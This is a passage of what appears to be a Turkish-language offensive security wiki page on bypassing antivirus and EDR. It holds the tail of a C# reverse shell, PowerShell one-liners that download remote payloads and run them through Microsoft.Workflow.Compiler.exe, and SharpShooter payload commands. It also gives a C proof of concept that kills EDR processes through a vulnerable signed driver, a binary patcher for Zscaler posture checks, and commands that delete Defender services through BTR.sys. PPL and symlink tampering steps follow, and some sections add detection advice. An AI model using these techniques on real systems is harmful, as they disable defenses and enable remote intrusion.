							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# derleyicisini kullanma

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazlası

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Savunmasız Sürücünü Getir (BYOVD) – Çekirdek Alanından AV/EDR’yi Öldürme

Storm-2603, fidye yazılımını bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç, **kendi savunmasız ama *imzalı* sürücüsünü** beraberinde getiriyor ve bunu, Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı çekirdek işlemlerini gerçekleştirmek için kötüye kullanıyor.<sup>[[12]](#references)</sup>

Önemli çıkarımlar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys`, ancak ikili dosya Antiy Labs’ın “System In-Depth Analysis Toolkit” aracındaki, yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır sürücüyü bir **kernel hizmeti** olarak kaydeder, ikinci satır ise sürücüyü başlatarak `\\.\ServiceMouse` yolunu user land'den erişilebilir hâle getirir.
3. **Sürücünün sunduğu IOCTL'ler**
   | IOCTL kodu | Yetenek                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile herhangi bir süreci sonlandırma (Defender/EDR hizmetlerini kapatmak için kullanılır) |
   | `0x990000D0` | Diskteki herhangi bir dosyayı silme |
   | `0x990001D0` | Sürücüyü kaldırma ve hizmeti silme |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarıyor**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer hardening özelliklerinden bağımsız olarak *protected* process'leri açabilir, sonlandırabilir veya kernel nesnelerini kurcalayabilir.

Tespit / Azaltma
• Windows'un `AToolsKrnl64.sys` dosyasını yüklemeyi reddetmesi için Microsoft’un vulnerable-driver block list'ini (`HVCI`, `Smart App Control`) etkinleştirin.
• Yeni *kernel* service'lerinin oluşturulmasını izleyin ve bir driver world-writable bir dizinden yüklendiğinde veya allow-list'te bulunmadığında uyarı verin.
• Custom device object'lerine açılan user-mode handle'ları ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Diskteki Binary'leri Patch'leyerek Zscaler Client Connector Posture Kontrollerini Atlama

Zscaler’ın **Client Connector**'ı device-posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi, tam bir bypass'ı mümkün kılar:

1. Posture değerlendirmesi **tamamen client-side** yapılır (sunucuya bir boolean gönderilir).
2. Dahili RPC endpoint'leri yalnızca bağlanan executable'ın **Zscaler tarafından imzalandığını** doğrular (`WinVerifyTrust` aracılığıyla).<sup>[[11]](#references)</sup>

**Diskteki dört imzalı binary'yi patch'leyerek** her iki mekanizma da etkisiz hâle getirilebilir:

| Binary | Patch'lenen orijinal mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür, böylece her kontrol uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust`'e dolaylı çağrı | NOP-ed ⇒ herhangi bir process (imzasız olsa bile) RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tunnel üzerindeki integrity kontrolleri | Kısa devre edilir |

Minimal patcher alıntısı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve hizmet yığınını yeniden başlattıktan sonra:

* **Tüm** duruş denetimleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana makine, Zscaler politikalarında tanımlanan iç ağa kısıtlamasız erişim kazanır.

Bu vaka çalışması, yalnızca istemci tarafındaki güven kararlarının ve basit imza denetimlerinin birkaç bayt yamasıyla nasıl aşılabileceğini gösterir.

## Microsoft Defender `BTR.sys` güvenilir işlevselliğinin kötüye kullanımı

Defender'ın **Önyükleme Sırasında Kaldırma** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir düzeltme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde ettikten sonra operatör, özel düzeltme işlemini taklit ederek amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirebilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ihlal sonrası AV/EDR etkisizleştirme ilkelidir** ve sürücü, dikkat çeken bir üçüncü taraf sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### Tek seferlik sürücüyü hazırlama

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer adlı bir kernel hizmeti kaydeder. `DriverEntry`, hizmetin `Args` değerini okur, başvurulan NTFS ADS'yi açar, eylem listesinin şifresini çözüp doğrular, geri bildirim yazar ve başarılı yürütmenin ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürerek sürücünün bellekte kalması yerine yükünün kaldırılmasını sağlar. Taklit edilmiş bir hizmet aşağıdaki karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` akışı, RC4 ile şifrelenmiş bir blob içerir. İncelenen build'ler sabit 256 baytlık bir anahtarı yeniden kullandığından şifreleme, bir yetkilendirme sınırı değildir. Geçerli bir düz metin; 24 baytlık genel bir başlık (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, başlık CRC'si ve payload'dan türetilen bir işlem kimliği), ardından null ile sonlandırılmış bir UTF-16 geri bildirim yolu ve istenen sayıda öğe içerir. Her öğe, 16 baytlık bir başlık (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ve **tam olarak dört NUL baytıyla** biten, eyleme özgü verilerden oluşur. Her başlık/veri bölgesi; polinom `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` ve **son XOR olmadan** (`~CRC32`) CRC-32 ile bağımsız olarak denetlenir; CRC durumu her bölge için sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen eylem kimlikleri, bu kernel primitiflerini sunar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Öğe verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 yolu]` | Kilitli bir dosya da dahil olmak üzere dosyayı siler |
| 2 | `[UTF-16 yolu]` | Boş bir dizini kaldırır |
| 3 | `[Flags][kaynak][hedef]` | Dosyayı saldırganın seçtiği korumalı bir yola taşır; boş hedef, silme anlamına gelir |
| 4 | `[Flags][anahtar yolu]` | Bir kayıt defteri anahtarını ve alt anahtarlarını özyinelemeli olarak siler |
| 5 | `[Flags][anahtar yolu + "\\" + değer]` | Bir kayıt defteri değerini siler |
| 6 | `[Flags][tür][boyut][anahtar yolu + "\\" + değer][veri]` | Bir kayıt defteri değeri oluşturur/günceller ve eksik anahtar yollarını oluşturur |

5 ve 6 numaralı eylemlerde, kablodaki anahtar/değer ayırıcısı **art arda gelen iki ters eğik çizgidir**; geleneksel biçimde yazılmış bir yol doğru şekilde bölünmez. Geri bildirim dosyası çoğunlukla isteği yansıtır; ancak her öğenin ilk dört veri baytı, öğenin sonuç `NTSTATUS` değeri olur. Baştaki flags alanına sahip olmayan 1 ve 2 numaralı eylemlerde BTR, bu durum için yer açmak üzere yolu ayrılmış son dört bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme penceresi

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) zincirin tamamını uygular: `BTR.sys` dosyasını yerel Defender'dan çıkarır, `<random>.sys:changelist` ve bir geri bildirim akışı oluşturur, zincirlenmiş eylemleri serileştirir/sağlama toplamlarını hesaplar/şifreler, hizmet kayıt defteri anahtarını doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver`'ı çağırır ya da `-trigger boot` için sürücüyü sistem başlangıcında yüklenecek şekilde bırakır. Kayıt defterini doğrudan hazırlamak, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle hizmet kurulumu için Event ID 7045 oluşturmaz. Önyükleme tetiklemeli kalıntılar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, depolama yığını ve `SystemRoot` bağlantısı hazır olmadan `DriverEntry` içinden dosya G/Ç işlemleri gerçekleştirir. `Start=1` ve yüksek öncelikli `Boot Bus Extender` grubu ise Phase 1'de çalıştırılır: NTFS kullanılabilir durumdadır, ancak sistem başlangıcında çalışan birçok güvenlik sürücüsü ve kullanıcı modu EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi boot-start filtreleri zaten yüklenmiş olabilir; ancak BTR bir sonraki başlangıçtan önce bu filtrelerin ikili dosyalarını veya hizmet yapılandırmasını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. BTR, boot-start değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla eylem tek bir işlemde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i başa ekler: BTR bu günlüğü oluşturur, ardından kendi silme isteğini işleyip kaldırılmadan önce günlüğü siler. Bu, kanıt miktarını azaltır; geri bildirimin `<random>.sys:<random>.dat` içine yerleştirilmesi ise sürücünün ve her iki stream'in birlikte kaldırılmasını sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un savunmasız sürücü engelleme listesi, BTR'nin amaçlanan işlevlerinin kötüye kullanılmasını önlemez. Meşru Defender soyunu rastgele bir launcher'dan ayırırken bu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlama işlemlerinin tümünde görülür. Aynı `.sys` dosyasına eklenmiş bir `.dat` ADS'si özellikle şüphelidir; çünkü meşru Defender genellikle geri bildirimi `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altına yerleştirir.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` yolunun doğrudan oluşturulmasını, eşleşen bir SCM yükleme olayı olmamasıyla ilişkilendirin.
- **Sysmon 6 -> 23:** Defender dışı bir soy hattından bilinen bir BTR sürücüsünün yüklenmesini, özellikle güvenlik ikili dosyaları için `System`/PID 4'e atfedilen sonraki dosya silme işlemleriyle ilişkilendirin.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının hızla oluşturulup silinmesi durumunda uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; bir güvenlik aracı sürücüsü `cmd.exe`, PowerShell veya bilinmeyen bir süreç tarafından hazırlandığında yalnızca Microsoft imzası güven sağlamak için yeterli değildir.

## LOLBIN'lerle PPL'yi Kötüye Kullanarak AV/EDR'ye Müdahale Etme

Protected Process Light (PPL), yalnızca eşit veya daha yüksek koruma düzeyindeki süreçlerin birbirlerine müdahale edebilmesini sağlayan bir imzalayan/düzey hiyerarşisi uygular. Saldırgan açısından, PPL etkin bir ikili dosyayı meşru biçimde başlatıp argümanlarını kontrol edebiliyorsanız, günlük kaydı gibi zararsız işlevleri AV/EDR'nin kullandığı korumalı dizinlere yazabilen, kısıtlı ve PPL destekli bir primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir sürecin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen DLL'ler) PPL uyumlu bir EKU ile imzalanmış olmalıdır.
- Süreç, `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` bayraklarıyla CreateProcess kullanılarak oluşturulmalıdır.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. kötü amaçlı yazılımlara karşı koruma imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler süreç oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına daha geniş bir giriş için ayrıca buraya bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (koruma düzeyini seçer ve argümanları hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım kalıbı:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikilisi `C:\Windows\System32\ClipUp.exe` kendisini alt süreç olarak başlatır ve çağıranın belirttiği bir yola log dosyası yazmak için parametre kabul eder.
- PPL süreci olarak başlatıldığında, dosya yazma işlemi PPL yetkileriyle gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 kısa yolları kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listeleyin: Her üst dizinde `dir /x` çalıştırın.
- cmd içinde kısa yolu türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (özet)
1) Bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile PPL destekli LOLBIN'i (ClipUp) başlatın.
2) Korumalı bir AV dizininde (ör. Defender Platform) dosya oluşturmayı zorlamak için ClipUp log yolu argümanını iletin. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili AV çalışırken normalde açık/kilitliyse (ör. MsMpEng.exe), AV başlamadan önce, açılışta yazma işlemi gerçekleştirecek ve daha önce çalışacağı garanti olan bir otomatik başlatma hizmeti kurun. Açılış sırasını Process Monitor (boot logging) ile doğrulayın.
4) Yeniden başlatıldığında PPL destekli yazma, AV ikililerini kilitlemeden önce gerçekleşir; hedef dosyayı bozarak AV'nin başlamasını engeller.

Örnek çağrı (güvenlik amacıyla yollar kısaltılmıştır):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği konumlandırma dışında kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma aralığı için yerel admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; önyükleme sırasında çalıştırmak dosya kilitlerini önler.

Tespitler
- Özellikle standart olmayan başlatıcılar tarafından başlatılan ve önyükleme sırasında olağandışı argümanlar alan `ClipUp.exe` süreçlerinin oluşturulması.
- Şüpheli ikilileri otomatik başlatacak şekilde yapılandırılmış yeni hizmetler ve bu hizmetlerin tutarlı olarak Defender/AV'den önce başlatılması. Defender başlangıç hatalarından önceki hizmet oluşturma/değiştirme işlemlerini inceleyin.
- Defender ikilileri/Platform dizinleri için dosya bütünlüğü izleme; korumalı süreç bayraklarına sahip süreçlerin beklenmedik dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulmuş süreçleri ve AV dışı ikililerin anormal PPL düzeyi kullanımını araştırın.

Azaltıcı önlemler
- WDAC/Code Integrity: PPL olarak hangi imzalı ikililerin ve hangi üst süreçler altında çalışabileceğini kısıtlayın; ClipUp'ın meşru bağlamlar dışındaki çalıştırılmasını engelleyin.
- Hizmet yönetimi: otomatik başlayan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve erken başlatma korumalarının etkin olduğundan emin olun; ikili bozulmasına işaret eden başlangıç hatalarını inceleyin.
- Ortamınızla uyumluysa güvenlik araçlarının bulunduğu birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Sürüm Klasörü Symlink Hijack'i ile Microsoft Defender'ı Kurcalama

Windows Defender, çalışacağı platformu aşağıdaki konumun altındaki alt klasörleri sıralayarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek leksikografik sürüm dizesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer, ardından Defender hizmet süreçlerini buradan başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin symlink'leri dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Önkoşullar
- Yerel Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (önyüklemede hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Neden işe yarar
- Defender kendi klasörlerine yazılmasını engeller; ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan leksikografik olarak en yüksek sürümü seçer.

Adım adım (örnek)
1) Geçerli platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) işleminin yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni process path’ini `C:\TMP\AV\` altında ve bu konumu yansıtan service yapılandırmasını/registry’yi gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın uygulama dizininden yüklediği DLL’leri bırakın/değiştirin ve böylece Defender’ın process’lerinde code execution elde edin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Version-symlink’i kaldırın; böylece sonraki başlatmada yapılandırılmış path çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını; admin rights gerektirdiğini unutmayın.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team’ler, runtime evasion işlemlerini C2 implant’ından çıkarıp hedef modülün kendisine taşıyabilir. Bunun için modülün Import Address Table’ı (IAT) hook’lanır ve seçili API’ler saldırganın kontrolündeki, position-independent code’a (PIC) yönlendirilir. Bu yaklaşım, evasion’ı birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF’lara ve post-exploitation DLL’lerine de genişletir.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob’u yerleştirin (başa eklenmiş veya eşlik eden). PIC kendi içinde eksiksiz ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR’ını tarayın ve hedeflenen import’lar için (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper’larına yönlendirin.
- Her PIC wrapper’ı, gerçek API adresine tail-call yapmadan önce evasion işlemlerini yürütür. Yaygın evasion işlemleri şunlardır:
  - Çağrı öncesi ve sonrası memory mask/unmask uygulama (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme).
  - Call-stack spoofing: Zararsız görünen bir stack oluşturup hedef API’ye geçiş yaparak call-stack analizinin beklenen frame’leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için, bir Aggressor script’inin (veya eşdeğerinin) Beacon, BOF’lar ve post-ex DLL’ler için hangi API’lerin hook’lanacağını kaydedebilmesi amacıyla bir arayüz dışa aktarın.

Burada IAT hooking neden kullanılır?
- Hook’lanan import’u kullanan her türlü kodda çalışır; araç kodunu değiştirmeyi veya belirli API’leri proxy’lemek için Beacon’a güvenmeyi gerektirmez.
- Post-ex DLL’leri kapsar: LoadLibrary*’ı hook’lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalayıp API çağrılarına aynı masking/stack evasion işlemlerini uygulamanıza olanak tanır.
- CreateProcessA/W’yi wrapper’larla sarmalayarak, call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir şekilde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapıldığını gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch uygulamadan önce yakaladığınız özgün IAT değerini veya LdrGetProcedureAddress'ı kullanarak çözümleyin.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları, sahte bir çağrı zinciri (zararsız modüllerin içindeki return address'lerle) oluşturur ve ardından gerçek API'ye geçiş yapar.
- Bu, Beacon/BOF'ların hassas API'lere giderken kanonik stack'ler oluşturmasını bekleyen tespitleri etkisiz kılar.
- API prologue'una gelmeden önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook'ların DLL yüklendiğinde otomatik olarak başlatılması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
